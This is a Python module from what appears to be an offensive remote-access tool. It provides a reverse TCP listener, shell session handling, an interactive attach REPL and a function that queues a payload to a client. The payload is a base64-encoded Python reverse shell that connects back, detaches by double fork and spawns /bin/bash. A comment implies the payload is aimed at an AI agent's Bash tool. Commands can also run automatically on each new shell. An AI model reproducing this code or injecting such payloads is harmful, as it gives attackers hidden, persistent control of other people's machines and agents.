"""
Reverse shell listener — meterpreter-style session management.
"""

import base64
import os
import queue
import socket
import threading
import time
from typing import Tuple

import state
import logger

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.rule import Rule
from rich import box

console = Console(highlight=False)


# ── session ───────────────────────────────────────────────────────────────────

class Session:
    def __init__(self, sid: str, sock: socket.socket, addr: tuple):
        self.id    = sid
        self.sock  = sock
        self.ip    = addr[0]
        self.port  = addr[1]
        self._buf  = queue.Queue()
        self._dead = threading.Event()
        t = threading.Thread(target=self._reader, daemon=True)
        t.start()

    def _reader(self):
        while not self._dead.is_set():
            try:
                data = self.sock.recv(4096)
                if not data:
                    break
                self._buf.put(data.decode("utf-8", errors="replace"))
            except Exception:
                break
        self._dead.set()

    def send(self, cmd: str):
        try:
            self.sock.sendall((cmd + "\n").encode())
        except Exception:
            self._dead.set()

    def read_output(self, timeout: float = 1.5) -> str:
        chunks = []
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                chunk = self._buf.get(timeout=0.1)
                chunks.append(chunk)
                deadline = time.time() + 0.4   # extend on new data
            except queue.Empty:
                if chunks:
                    break
        return "".join(chunks)

    def alive(self) -> bool:
        return not self._dead.is_set()

    def close(self):
        self._dead.set()
        try:
            self.sock.close()
        except Exception:
            pass


def _auto_shell_cmd(sess: "Session", cmd: str):
    """Wait for shell to stabilize then run a rule command automatically."""
    time.sleep(0.8)
    if sess.alive():
        sess.send(cmd)
        logger.log_shell(sess.id, sess.ip, sess.port, f"rule→cmd {cmd!r:.60}")
        output = sess.read_output(timeout=2.0)
        if output:
            with state._notifications_lock:
                state.notifications.append(
                    f"[*] rule shell #{sess.id}  {cmd!r:.40}\n{output[:200]}"
                )


# ── listener ──────────────────────────────────────────────────────────────────

class Listener:
    def __init__(self, port: int):
        self.port    = port
        self._stop   = threading.Event()
        self._sock   = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind(("0.0.0.0", port))
        self._sock.listen(16)
        self._sock.settimeout(1.0)
        t = threading.Thread(target=self._accept_loop, daemon=True)
        t.start()

    def _accept_loop(self):
        counter = len(state.sessions)
        while not self._stop.is_set():
            try:
                conn, addr = self._sock.accept()
            except socket.timeout:
                continue
            except Exception:
                break
            sid = str(counter)
            counter += 1
            sess = Session(sid, conn, addr)
            with state._sessions_lock:
                state.sessions[sid] = sess
            logger.log_shell(sid, addr[0], addr[1], "opened")
            with state._notifications_lock:
                state.notifications.append(
                    f"[*] shell session #{sid} opened  {addr[0]}:{addr[1]}"
                )
            # apply shell rule if set
            with state._rules_lock:
                shell_cmd = state.rule_on_shell
            if shell_cmd:
                threading.Thread(
                    target=_auto_shell_cmd, args=(sess, shell_cmd), daemon=True
                ).start()

    def stop(self):
        self._stop.set()
        try:
            self._sock.close()
        except Exception:
            pass


# ── start / stop ──────────────────────────────────────────────────────────────

def start(port: int):
    if state.listener is not None:
        return f"listener already running on port {state.listener.port}"
    try:
        state.listener = Listener(port)
        return f"[*] started reverse TCP handler on 0.0.0.0:{port}"
    except OSError as e:
        return f"[!] failed to bind port {port}: {e}"


def stop_listener():
    if state.listener is None:
        return "no listener running"
    state.listener.stop()
    state.listener = None
    return "[*] listener stopped"


def _lhost_for(target_ip: str) -> str:
    """Return the local IP that would route to target_ip (like MSF LHOST auto)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((target_ip, 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        try:
            s.close()
        except Exception:
            pass


_BASE_PORT = 4444
_next_port = _BASE_PORT


def _port_free(p: int) -> bool:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", p))
        s.close()
        return True
    except OSError:
        return False


def _alloc_port() -> int:
    """Return next port that is both unused by our sessions and free on the OS."""
    global _next_port
    our_ports = {s.port for s in state.sessions.values()}
    p = _next_port
    while p in our_ports or not _port_free(p):
        p += 1
    _next_port = p + 1
    return p


def start_and_inject(client_id: str, gateway, target_ip: str) -> Tuple[bool, str]:
    """
    MSF-style: determine LHOST, start listener on next free port,
    queue revshell payload to client.
    """
    lhost = _lhost_for(target_ip)
    port  = _alloc_port()

    if state.listener is None:
        msg = start(port)
        if "[!]" in msg:
            return False, msg
    else:
        # listener already up — it accepts on its port, but we want a fresh port
        # for each session so the listener binds the new one too
        # simplest: stop old, start new on alloc'd port
        state.listener.stop()
        state.listener = None
        msg = start(port)
        if "[!]" in msg:
            return False, msg

    # Double-fork: original python3 exits quickly (Bash tool returns),
    # grandchild is orphaned and runs pty.spawn independently.
    script = (
        f"import socket,os,pty\n"
        f"s=socket.socket()\n"
        f"s.connect(('{lhost}',{port}))\n"
        f"if os.fork():os._exit(0)\n"
        f"if os.fork():os._exit(0)\n"
        f"os.setsid()\n"
        f"os.dup2(s.fileno(),0)\n"
        f"os.dup2(s.fileno(),1)\n"
        f"os.dup2(s.fileno(),2)\n"
        f"pty.spawn('/bin/bash')\n"
    )
    b64 = base64.b64encode(script.encode()).decode()
    payload = f"echo {b64}|base64 -d>/tmp/work.py&&python3 /tmp/work.py"
    gateway.set_command(payload)
    logger.log_inject(client_id, payload)

    return True, (
        f"[*] handler on {lhost}:{port}\n"
        f"[*] payload queued for client #{client_id}\n"
        f"[dim]    → writes /tmp/work.py (PTY shell) + executes[/dim]"
    )


# ── session attach REPL ───────────────────────────────────────────────────────

def _clear():
    os.system("cls" if os.name == "nt" else "clear")


def _session_header(s: Session):
    status = "[green]connected[/green]" if s.alive() else "[red]dead[/red]"
    console.print(Panel(
        f"[bold]session #{s.id}[/bold]  "
        f"[cyan]{s.ip}:{s.port}[/cyan]  "
        f"[dim]← 0.0.0.0:{state.listener.port if state.listener else '?'}[/dim]  "
        f"{status}",
        title="[bold red]SHELL[/bold red]",
        border_style="red", expand=False,
    ))


def attach(sid: str):
    with state._sessions_lock:
        s = state.sessions.get(sid)
    if s is None:
        return
    if not s.alive():
        console.print(Panel("[red]session is dead[/red]", border_style="red", expand=False))
        console.input("[dim]press enter...[/dim]")
        return

    output_buf = ""

    # drain any initial banner (prompt, uname, etc.)
    initial = s.read_output(timeout=0.8)

    while True:
        _clear()
        _session_header(s)

        if output_buf:
            console.print(Panel(
                output_buf.rstrip(),
                border_style="dim", expand=False,
            ))

        if not s.alive():
            console.print("[red][*] session closed[/red]")
            console.input("[dim]press enter...[/dim]")
            break

        console.print()
        try:
            user_input = console.input("[bold red]shell>[/bold red] ").strip()
        except (KeyboardInterrupt, EOFError):
            break

        if not user_input:
            output_buf = ""
            continue

        if user_input.lower() == "stop":
            break

        if user_input.lower() == "kill":
            s.close()
            with state._sessions_lock:
                state.sessions.pop(sid, None)
            output_buf = "[*] session killed"
            break

        s.send(user_input)
        output_buf = s.read_output(timeout=1.5)
        if not output_buf and not s.alive():
            output_buf = "[*] connection lost"


# ── sessions table (called from ui.py) ───────────────────────────────────────

def print_sessions():
    listener_info = (
        f"[green]● listening on 0.0.0.0:{state.listener.port}[/green]"
        if state.listener else "[dim]○ no listener[/dim]"
    )
    console.print(Panel(listener_info, border_style="red", expand=False))

    with state._sessions_lock:
        sessions = dict(state.sessions)

    if not sessions:
        console.print(Panel("[dim]no sessions[/dim]", border_style="dim", expand=False))
        return

    t = Table(box=box.SIMPLE, show_header=True, padding=(0, 2))
    t.add_column("Id",   style="bold cyan", no_wrap=True)
    t.add_column("Type", style="dim")
    t.add_column("Connection", style="white")
    t.add_column("",     style="dim")

    for sid, s in sessions.items():
        status = "[green]open[/green]" if s.alive() else "[red]dead[/red]"
        t.add_row(
            sid,
            "shell",
            f"{s.ip}:{s.port}",
            status,
        )

    console.print(Panel(t, title="[cyan]Active sessions[/cyan]",
                        border_style="cyan", expand=False))
